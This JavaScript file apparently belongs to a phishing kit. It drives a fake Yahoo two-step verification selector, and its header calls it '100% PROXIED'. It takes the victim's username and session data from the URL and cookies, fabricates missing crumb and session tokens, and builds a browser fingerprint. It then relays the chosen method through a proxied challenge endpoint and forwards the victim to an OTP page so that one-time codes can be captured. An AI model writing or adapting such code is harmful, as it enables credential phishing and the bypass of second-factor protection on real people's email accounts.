// ===== YAHOO 2FA PAGE - 100% PROXIED SYNCHRONICITY =====
console.log("Yahoo 2FA JS - 100% Native/Hybrid Fluent Data Flow Initialized")

const $ = window.jQuery || window.$

if ($) {
  $(document).ready(() => {
    console.log("Yahoo 2FA selection system initialized")

    // ===== CONFIGURATION =====
    const config = {
      redirectDelay: 1500,
      sessionTimeout: 30000,
    }

    let selectedMethod = ""
    let sessionData = {}
    let username = ""

    // ===== SESSION MANAGEMENT =====
    const SessionManager = {
      extractSessionData: () => {
        const urlParams = new URLSearchParams(window.location.search)
        const sessionParam = urlParams.get("s")

        if (sessionParam) {
          try {
            return JSON.parse(decodeURIComponent(sessionParam))
          } catch (e) {
            console.log("Failed to parse session parameter")
          }
        }

        const cookieMatch = document.cookie.match(/yh_session=([^;]+)/)
        if (cookieMatch) {
          try {
            return JSON.parse(decodeURIComponent(cookieMatch[1]))
          } catch (e) {
            console.log("Failed to parse session cookie")
          }
        }

        return {}
      },

      generateFingerprint: () =>
        JSON.stringify({
          screen: `${screen.width}x${screen.height}`,
          colorDepth: screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          platform: navigator.platform,
          userAgent: navigator.userAgent,
          timestamp: Date.now(),
          sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
        }),
    }

    // ===== USERNAME RETRIEVAL =====
    function getUsername() {
      const urlParams = new URLSearchParams(window.location.search)
      const user = urlParams.get("u")

      if (user) return decodeURIComponent(user)
      if (sessionData.username) return sessionData.username

      const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
      if (cookieMatch) return decodeURIComponent(cookieMatch[1])

      return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || ""
    }

    // ===== STATE MANAGEMENT =====
    function showState(state) {
      $("#main-form, #error-container, #loading-state").hide()
      $(`#${state}`).show()
    }

    function showError(message) {
      $("#error-message").text(message || "Unable to set up verification. Please try again.")
      showState("error-container")
    }

    // ===== METHOD SELECTION =====
    function selectMethod(method) {
      selectedMethod = method

      // Remove previous selections
      $(".yahoo-verification-option").removeClass("selected")

      // Add selection to clicked method
      $(`.yahoo-verification-option[data-method="${method}"]`).addClass("selected")

      // Enable submit button
      $("#submit-btn").prop("disabled", false)

      // Update hidden field
      $("#selectedMethod").val(method)

      console.log("Selected verification method:", method)
    }

    // ===== FORM SUBMISSION =====
    function handleMethodSelection() {
      if (!selectedMethod) {
        showError("Please select a verification method.")
        return
      }

      console.log("Processing method selection:", selectedMethod)
      showState("loading-state")

      const formData = {
        sessionIndex: sessionData.sessionIndex || "1",
        crumb: sessionData.crumb || "auto_crumb_" + Date.now(),
        acrumb: sessionData.acrumb || "auto_acrumb_" + Date.now(),
        sessionToken: sessionData.sessionToken || "sess_" + Date.now(),
        "browser-fp-data": SessionManager.generateFingerprint(),
        timestamp: Date.now(),
        selectedMethod: selectedMethod,
        username: username,
        method: selectedMethod,
      }

      $.ajax({
        url: "/account/challenge/challenge-selector",
        method: "POST",
        data: formData,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: window.location.origin,
          Referer: window.location.href,
          "User-Agent": navigator.userAgent,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
        },
        xhrFields: {
          withCredentials: true,
        },
        timeout: 15000,
        success: (response, textStatus, xhr) => {
          console.log("Method selection successful")
          handleSelectionSuccess(response, xhr)
        },
        error: (xhr, textStatus, errorThrown) => {
          console.log("Method selection error:", textStatus, xhr.status)
          handleSelectionError(xhr, textStatus, errorThrown)
        },
      })
    }

    // ===== SUCCESS HANDLER =====
    function handleSelectionSuccess(response, xhr) {
      console.log("2FA method selection successful")

      // Store method selection
      sessionStorage.setItem("yahoo_2fa_method", selectedMethod)
      sessionStorage.setItem("yahoo_2fa_timestamp", Date.now().toString())

      setTimeout(() => {
        const otpUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
        console.log("Redirecting to OTP page:", otpUrl)
        window.location.href = otpUrl
      }, config.redirectDelay)
    }

    // ===== ERROR HANDLER =====
    function handleSelectionError(xhr, textStatus, errorThrown) {
      console.error("Method selection error:", {
        status: xhr.status,
        textStatus: textStatus,
        errorThrown: errorThrown,
      })

      if (xhr.status === 0) {
        // Possible redirect - try OTP page anyway
        setTimeout(() => {
          const otpUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
          window.location.href = otpUrl
        }, 2000)
        return
      }

      showError("Unable to set up verification method. Please try again.")
    }

    // ===== EVENT HANDLERS =====

    // Method selection click handlers
    $(".yahoo-verification-option").click(function () {
      const method = $(this).data("method")
      selectMethod(method)
    })

    // Form submission
    $("#verification-form").on("submit", (e) => {
      e.preventDefault()
      handleMethodSelection()
      return false
    })

    // Retry button
    $("#refreshButton").click(() => {
      selectedMethod = ""
      $(".yahoo-verification-option").removeClass("selected")
      $("#submit-btn").prop("disabled", true)
      showState("main-form")
    })

    // ===== INITIALIZATION =====
    function initializePage() {
      console.log("Initializing 2FA selection page")

      sessionData = SessionManager.extractSessionData()
      username = getUsername()

      if (!username) {
        console.log("No username found")
        showError("Session expired. Please start over.")
        return false
      }

      $("#userEmail").text(username)
      $("#username").val(username)

      // Populate form fields
      Object.keys(sessionData).forEach((key) => {
        const element = $(`#${key}`)
        if (element.length && sessionData[key]) {
          element.val(sessionData[key])
        }
      })

      $("#timestamp").val(Date.now())
      $("#browser-fp-data").val(SessionManager.generateFingerprint())

      console.log("2FA page initialized for user:", username)
      return true
    }

    // ===== GLOBAL METHOD SELECTION FUNCTION =====
    window.selectMethod = selectMethod

    // ===== START INITIALIZATION =====
    if (!initializePage()) return

    console.log("Yahoo 2FA selection system fully initialized")
  })
} else {
  console.error("jQuery not found - Yahoo 2FA JS requires jQuery")
}
